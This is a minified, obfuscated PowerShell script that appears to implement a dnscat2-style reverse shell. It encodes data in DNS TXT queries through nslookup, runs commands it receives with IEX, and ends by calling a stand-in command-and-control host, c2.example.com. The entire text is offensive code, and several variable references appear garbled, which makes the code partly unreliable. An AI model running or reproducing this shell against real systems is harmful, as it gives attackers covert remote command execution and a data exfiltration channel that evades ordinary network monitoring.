function Stream1_Setup{param($a)if($b:Verbose){$c=$True}function ConvertTo-HexArray{param($d)$e=@()$d.ToCharArray()| %{"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_}else{[string]$_}}| %{$e +=$_}return $e}function SendPacket{param($i,$j,$k)$l=("set type=TXT`nserver $j`nset port=$k`nset domain=.com`nset retry=1`n" + $i + "`nexit")$m=($l | nslookup 2>&1 | Out-String)if($m.Contains('"')){return ([regex]::Match($m.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}else{return 1}}function Create_SYN{param($p,$q,$r,$s)return($r +([string](Get-Random -Maximum 9999 -Minimum 1000))+ "00" + $p + $q + "0000" + $s)}function Create_FIN{param($p,$r,$s)return($r +([string](Get-Random -Maximum 9999 -Minimum 1000))+ "02" + $p + "00" + $s)}function Create_MSG{param($p,$q,$C,$D,$r,$s)return($r +([string](Get-Random -Maximum 9999 -Minimum 1000))+ "01" + $p+$q + $C+$D + $s)}function DecodePacket{param($i)if((($i.Length)%2 -eq 1)-or($i.Length -eq 0)){return 1}$C=($i[10..13] -join "")$q=($i[14..17] -join "")[byte[]]$T=@()if($i.Length -gt 18){$V=$i.Substring(18)while($V.Length -gt 0){$T +=[byte[]][Convert]::ToInt16(($V[0..1] -join ""),16)$V=$V.Substring(2)}}return $i,$T,$C,$q}function AcknowledgeData{param($T,$C)$e=[string]("{0:x}" -f (([uint16]("0x" + $C)+ $T.Length)% 65535))if($e.Length -ne 4){$e=(("0"*(4-$e.Length))+ $e)}return $e}$ag=@{}$ag["DNSServer"],$ag["DNSPort"],$ag["Domain"],$ag["FailureThreshold"]=$ai($ag["DNSPort"] -eq ''){$ag["DNSPort"] = "53"}$ag["Tag"]=""$ag["Domain"] = ("." + $ag["Domain"])$ag["Create_SYN"]=${function:Create_SYN}$ag["Create_MSG"]=${function:Create_MSG}$ag["Create_FIN"]=${function:Create_FIN}$ag["DecodePacket"]=${function:DecodePacket}$ag["ConvertTo-HexArray"]=${function:ConvertTo-HexArray}$ag["AckData"]=${function:AcknowledgeData}$ag["SendPacket"]=${function:SendPacket}$ag["SessionId"]=([string](Get-Random -Maximum 9999 -Minimum 1000))$ag["SeqNum"]=([string](Get-Random -Maximum 9999 -Minimum 1000))$ag["Encoding"]=New-Object System.Text.AsciiEncoding$ag["Failures"]=0$ax=(Invoke-Command $ag["Create_SYN"] -ArgumentList @($ag["SessionId"],$ag["SeqNum"],$ag["Tag"],$ag["Domain"]))$aD=(Invoke-Command $ag["SendPacket"] -ArgumentList @($ax,$ag["DNSServer"],$ag["DNSPort"]))$aI=(Invoke-Command $ag["DecodePacket"] -ArgumentList @($aD))if($aI -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}$T=$aI[1]if($T -ne ""){$ag["InputData"]=""}$ag["AckNum"]=$aI[2]$ag["MaxMSGDataSize"]=(244 -(Invoke-Command $ag["Create_MSG"] -ArgumentList @($ag["SessionId"],$ag["SeqNum"],$ag["AckNum"],"",$ag["Tag"],$ag["Domain"])).Length)if($ag["MaxMSGDataSize"] -le 0){return "Domain name is too long."}return $ag}function Stream1_ReadData{param($ag)if($b:Verbose){$c=$True}$a5=@()$a6=""if($ag["InputData"] -ne $null){$e=(Invoke-Command $ag["ConvertTo-HexArray"] -ArgumentList @($ag["InputData"]))$ba=0$bb=0foreach($bc in $e){if($ba -ge 30){$ba=0$a6 +="."}if($bb -ge($ag["MaxMSGDataSize"])){$a5 +=$a6.TrimEnd(".")$bb=0$ba=0$a6=""}$a6 +=$bc$ba +=2$bb +=2}$a6=$a6.TrimEnd(".")$a5 +=$a6$ag["InputData"]=""}else{$a5=@("")}[byte[]]$T=@()foreach($a6 in $a5){try{$bB=Invoke-Command $ag["Create_MSG"] -ArgumentList @($ag["SessionId"],$ag["SeqNum"],$ag["AckNum"],$a6,$ag["Tag"],$ag["Domain"])}catch{Write-Verbose "DNSCAT2: Failed to create packet." ; $ag["Failures"] +=1 ; continue}try{$i=(Invoke-Command $ag["SendPacket"] -ArgumentList @($bB,$ag["DNSServer"],$ag["DNSPort"]))}catch{Write-Verbose "DNSCAT2: Failed to send packet." ; $ag["Failures"] +=1 ; continue}try{$aI=(Invoke-Command $ag["DecodePacket"] -ArgumentList @($i))if($aI.Length -ne 4){Write-Verbose "DNSCAT2: Failure to decode packet,dropping..."; $ag["Failures"] +=1 ; continue}$ag["AckNum"]=$aI[2]$ag["SeqNum"]=$aI[3]$T +=$aI[1]}catch{Write-Verbose "DNSCAT2: Failure to decode packet,dropping..." ; $ag["Failures"] +=1 ; continue}if($aI -eq 1){Write-Verbose "DNSCAT2: Failure to decode packet,dropping..." ; $ag["Failures"] +=1 ; continue}}if($ag["Failures"] -ge $ag["FailureThreshold"]){break}if($T -ne @()){$ag["AckNum"]=(Invoke-Command $ag["AckData"] -ArgumentList @($T,$ag["AckNum"]))}return $T,$ag}function Stream1_WriteData{param($D,$ag)$ag["InputData"]=$ag["Encoding"].GetString($D)return $ag}function Stream1_Close{param($ag)$ck=Invoke-Command $ag["Create_FIN"] -ArgumentList @($ag["SessionId"],$ag["Tag"],$ag["Domain"])Invoke-Command $ag["SendPacket"] -ArgumentList @($ck,$ag["DNSServer"],$ag["DNSPort"])| Out-Null}function Main{param($ct)try{$cu=New-Object System.Text.AsciiEncoding[byte[]]$cv=@()if($i -ne $null){Write-Verbose "Input from -i detected..."if(Test-Path $i){[byte[]]$cv=([io.file]::ReadAllBytes($i))}elseif($i.GetType().Name -eq "Byte[]"){[byte[]]$cv=$i}elseif($i.GetType().Name -eq "String"){[byte[]]$cv=$cz.GetBytes($i)}else{Write-Host "Unrecognised input type." ; return}}Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"try{$cA=Stream1_Setup $ct}catch{Write-Verbose "Stream 1 Setup Failure" ; return}Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"try{$cC=$cz.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))$cE=("PS " + (pwd).Path + "> ")$cF=""      $D=$null}catch{Write-Verbose "Stream 2 Setup Failure" ; return}if($cv -ne @()){Write-Verbose "Writing input to Stream 1..."try{$cA=Stream1_WriteData $cv $cA}catch{Write-Host "Failed to write input to Stream 1" ; return}}if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."while($True){try{$cE=$null$cM=$cN($cF -ne ""){try{[byte[]]$cM=$cz.GetBytes((IEX $cF 2>&1 | Out-String))}catch{[byte[]]$cM=$cz.GetBytes(($_ | Out-String))}$cE=$cz.GetBytes(("PS " + (pwd).Path + "> "))}$D +=$cC$cC=$null$D +=$cM$D +=$cE$cF=""if($D -ne $null){$cA=Stream1_WriteData $D $cA}$D=$null}catch{Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return}try{$D,$cA=Stream1_ReadData $db($D.Length -eq 0){Start-Sleep -Milliseconds 100}if($D -ne $null){$cF=$cz.GetString($D)}$D=$null}catch{Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return}}}finally{try{Write-Verbose "Closing Stream 1..."Stream1_Close $cA}catch{Write-Verbose "Failed to close Stream 1"}}}Main @('','','c2.example.com',10)